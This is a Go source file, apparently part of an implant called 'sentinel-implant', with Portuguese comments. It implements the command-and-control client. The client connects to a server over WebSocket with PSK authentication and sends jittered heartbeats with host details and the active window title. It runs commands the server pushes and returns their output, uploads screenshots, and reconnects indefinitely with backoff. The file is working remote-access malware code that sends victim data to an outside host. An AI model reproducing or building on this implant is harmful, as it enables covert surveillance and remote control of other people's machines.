package connection

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"sentinel-implant/config"
	"sentinel-implant/core/telemetry"
	"sentinel-implant/handlers"
)

// WebSocketClient gerencia a conexão WebSocket com o servidor
type WebSocketClient struct {
	conn        *websocket.Conn
	url         string
	psk         string
	hwid        string
	isConnected bool
	writeMutex  sync.Mutex
	done        chan struct{}
	closeMutex  sync.Mutex
}

// ReconnectManager gerencia o backoff exponencial para reconexão
type ReconnectManager struct {
	minDelay time.Duration
	maxDelay time.Duration
	attempt  int
}

// NewClient cria um novo cliente WebSocket
func NewClient(url, psk, hwid string) *WebSocketClient {
	return &WebSocketClient{
		url:  url,
		psk:  psk,
		hwid: hwid,
		done: make(chan struct{}),
	}
}

// NewReconnectManager cria um novo gerenciador de reconexão
func NewReconnectManager(min, max time.Duration) *ReconnectManager {
	return &ReconnectManager{
		minDelay: min,
		maxDelay: max,
		attempt:  0,
	}
}

// GetNextDelay calcula o próximo delay com backoff exponencial + jitter
func (r *ReconnectManager) GetNextDelay() time.Duration {
	// Backoff: min * 2^attempt
	delay := float64(r.minDelay) * math.Pow(2, float64(r.attempt))

	// Aplicar teto
	if delay > float64(r.maxDelay) {
		delay = float64(r.maxDelay)
	}

	// Adicionar jitter (±20%)
	jitter := delay * 0.2 * (rand.Float64()*2 - 1)
	delay += jitter

	r.attempt++
	return time.Duration(delay)
}

// Reset reinicia o contador após conexão bem-sucedida
func (r *ReconnectManager) Reset() {
	r.attempt = 0
}

// Connect estabelece conexão WebSocket com autenticação PSK
func (c *WebSocketClient) Connect() error {
	// Calcular auth hash
	timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())
	hash := sha256.Sum256([]byte(c.psk + timestamp))
	authHash := hex.EncodeToString(hash[:])

	// Configurar headers de autenticação
	headers := http.Header{}
	headers.Set("X-Agent-Auth", authHash)
	headers.Set("X-Agent-Timestamp", timestamp)

	// Configurar dialer
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}

	// Conectar
	conn, _, err := dialer.Dial(c.url, headers)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}

	c.conn = conn
	c.isConnected = true
	c.done = make(chan struct{})

	return nil
}

// SendMessage envia uma mensagem pelo WebSocket (thread-safe)
func (c *WebSocketClient) SendMessage(msg WebSocketMessage) error {
	c.writeMutex.Lock()
	defer c.writeMutex.Unlock()

	if !c.isConnected || c.conn == nil {
		return fmt.Errorf("not connected")
	}

	return c.conn.WriteJSON(msg)
}

// SendRaw envia bytes raw pelo WebSocket
func (c *WebSocketClient) SendRaw(data []byte) error {
	c.writeMutex.Lock()
	defer c.writeMutex.Unlock()

	if !c.isConnected || c.conn == nil {
		return fmt.Errorf("not connected")
	}

	return c.conn.WriteMessage(websocket.TextMessage, data)
}

// ReadMessage lê uma mensagem do WebSocket
func (c *WebSocketClient) ReadMessage() (WebSocketMessage, error) {
	var msg WebSocketMessage

	if !c.isConnected || c.conn == nil {
		return msg, fmt.Errorf("not connected")
	}

	_, data, err := c.conn.ReadMessage()
	if err != nil {
		return msg, err
	}

	err = json.Unmarshal(data, &msg)
	return msg, err
}

// Close fecha a conexão WebSocket
func (c *WebSocketClient) Close() {
	c.closeMutex.Lock()
	defer c.closeMutex.Unlock()

	if c.conn != nil {
		c.isConnected = false
		c.conn.Close()

		// Sinalizar para goroutines pararem
		select {
		case <-c.done:
			// Já fechado
		default:
			close(c.done)
		}
	}
}

// IsConnected retorna se está conectado
func (c *WebSocketClient) IsConnected() bool {
	return c.isConnected
}

// heartbeatLoop envia heartbeats periodicamente
func (c *WebSocketClient) heartbeatLoop() {
	// Jitter inicial para não sincronizar todos os agentes
	jitter := time.Duration(rand.Intn(2000)) * time.Millisecond
	time.Sleep(jitter)

	ticker := time.NewTicker(config.Current.HeartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.done:
			return
		case <-ticker.C:
			if !c.isConnected {
				return
			}

			// Coletar telemetria
			heartbeat := telemetry.CollectHeartbeat(c.hwid)

			// Criar payload
			payload := HeartbeatPayload{
				HWID:         heartbeat.HWID,
				Hostname:     heartbeat.Hostname,
				OSInfo:       heartbeat.OSInfo,
				IPLocal:      heartbeat.IPLocal,
				CPULoad:      heartbeat.CPULoad,
				RAMUsage:     heartbeat.RAMUsage,
				ActiveWindow: heartbeat.ActiveWindow,
			}

			// Enviar
			msg, err := NewMessage(TypeHeartbeat, payload)
			if err != nil {
				continue
			}

			if err := c.SendMessage(msg); err != nil {
				// Conexão provavelmente caiu
				return
			}

			// Adicionar jitter no próximo tick (±2s)
			jitterMs := rand.Intn(4000) - 2000
			ticker.Reset(config.Current.HeartbeatInterval + time.Duration(jitterMs)*time.Millisecond)
		}
	}
}

// messageLoop processa mensagens do servidor
func (c *WebSocketClient) messageLoop() {
	for {
		select {
		case <-c.done:
			return
		default:
			msg, err := c.ReadMessage()
			if err != nil {
				// Conexão provavelmente caiu
				c.isConnected = false
				return
			}

			// Processar mensagem
			c.handleMessage(msg)
		}
	}
}

// handleMessage processa uma mensagem recebida
func (c *WebSocketClient) handleMessage(msg WebSocketMessage) {
	switch msg.Type {
	case TypeCommand:
		c.handleCommand(msg)
	default:
		// Ignorar mensagens desconhecidas silenciosamente
	}
}

// handleCommand processa um comando do servidor
func (c *WebSocketClient) handleCommand(msg WebSocketMessage) {
	var cmd CommandPayload
	if err := msg.ParsePayload(&cmd); err != nil {
		return
	}

	// Executar comando
	output, err := handlers.ExecuteCommand(cmd.Type, cmd.Params)

	// Preparar resultado
	status := StatusSuccess
	if err != nil {
		status = StatusError
		if output == "" {
			output = err.Error()
		} else {
			output = output + "\n[ERROR] " + err.Error()
		}
	}

	// Enviar resultado
	result := CommandResultPayload{
		CommandID: cmd.ID,
		HWID:      c.hwid,
		Status:    status,
		Output:    output,
	}

	resultMsg, _ := NewMessage(TypeCommandResult, result)
	c.SendMessage(resultMsg)

	// Se foi screenshot, enviar a imagem separadamente
	if cmd.Type == "SCREENSHOT" && status == StatusSuccess {
		c.sendScreenshot(cmd.ID)
	}
}

// sendScreenshot captura e envia screenshot
func (c *WebSocketClient) sendScreenshot(commandID string) {
	base64Data, err := handlers.GetScreenshotBase64()
	if err != nil {
		return
	}

	upload := ScreenshotUploadPayload{
		HWID:             c.hwid,
		TriggerCommandID: commandID,
		ImageBase64:      base64Data,
	}

	msg, _ := NewMessage(TypeScreenshotUpload, upload)
	c.SendMessage(msg)
}

// RunForever executa o loop infinito de conexão/reconexão
func (c *WebSocketClient) RunForever() {
	reconnect := NewReconnectManager(
		config.Current.ReconnectMinDelay,
		config.Current.ReconnectMaxDelay,
	)

	for {
		// Tentar conectar
		err := c.Connect()
		if err != nil {
			delay := reconnect.GetNextDelay()
			time.Sleep(delay)
			continue
		}

		// Conexão bem-sucedida - resetar backoff
		reconnect.Reset()

		// Enviar heartbeat inicial
		heartbeat := telemetry.CollectHeartbeat(c.hwid)
		payload := HeartbeatPayload{
			HWID:         heartbeat.HWID,
			Hostname:     heartbeat.Hostname,
			OSInfo:       heartbeat.OSInfo,
			IPLocal:      heartbeat.IPLocal,
			CPULoad:      heartbeat.CPULoad,
			RAMUsage:     heartbeat.RAMUsage,
			ActiveWindow: heartbeat.ActiveWindow,
		}
		msg, _ := NewMessage(TypeHeartbeat, payload)
		c.SendMessage(msg)

		// Iniciar goroutine de heartbeat
		go c.heartbeatLoop()

		// Rodar loop de mensagens (bloqueia até desconectar)
		c.messageLoop()

		// Se chegou aqui, conexão caiu
		c.Close()

		// Pequena pausa antes de reconectar
		time.Sleep(100 * time.Millisecond)
	}
}
